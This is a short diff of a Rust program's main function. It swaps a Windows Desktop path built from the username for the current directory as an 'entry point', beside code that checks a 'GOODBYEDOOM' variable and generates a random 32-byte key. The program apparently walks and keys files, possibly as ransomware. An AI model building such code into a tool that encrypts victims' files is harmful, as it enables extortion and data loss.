@@ -141,17 +141,10 @@ fn main() {
         Err(_) => panic!("GOODBYEDOOM not set"),
     }
 
-    let username = match env::var("username") {
-        Ok(username) => username,
-        Err(_) => panic!("No username set"),
-    };
-
     let mut key = [0u8; 32];
     OsRng.fill_bytes(&mut key);
 
-    let mut entryPath: String = r#"C:\Users\"#.to_string();
-    entryPath.push_str(&username);
-    entryPath.push_str(r#"\Desktop"#);
+    let entryPath = env::current_dir().unwrap().to_str().unwrap().to_string();
 
     println!("Entry point: {}", entryPath);
 
